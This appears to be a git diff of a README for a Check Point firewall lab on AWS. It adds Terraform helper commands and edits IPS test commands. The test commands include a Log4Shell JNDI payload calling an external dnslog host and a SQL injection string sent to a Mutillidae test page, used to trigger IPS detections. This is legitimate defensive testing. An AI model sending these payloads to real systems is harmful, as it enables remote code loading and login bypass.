@@ -120,6 +120,16 @@ In [route tables for TGW attachment subnets](https://eu-central-1.console.aws.am
 
 In [route tables for NAT Gateways](https://eu-central-1.console.aws.amazon.com/vpc/home?region=eu-central-1#RouteTables:search=chkp-nat), route back to TGW attachment subnet in same region via GWLBe in same region.
 
+There are even some helper commands:
+```
+terraform output -raw cmd_fw_on
+
+terraform output -raw cmd_fw_off
+
+# or even
+terraform output -raw cmd_fw_on | bash
+```
+
 ### 10. Test traffic from instances in TGW attachment subnet
 
 Connect to instances using Session Manager and initiate traffic to Internet (*curl*, *ping*, etc.). Monitor Check Point logs.
@@ -136,9 +146,9 @@ while true; do date; ping -c 3 1.1.1.1; echo; done
 
 Cause IPS incidents (should be prevented/catched by IPS if configured):
 ```
-curl http://www.cpcheckme.com/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' -v
+curl --ipv4 http://www.cpcheckme.com/ -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}' -v
 
-curl -k 'http://www.cpcheckme.com/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details'
+curl --ipv4 'http://www.cpcheckme.com/mutillidae/index.php?page=user-info.php&username=%27+or+1%3D1--+&password=&user-info-php-submit-button=View+Account+Details'
 ```
 
 ## Various materials
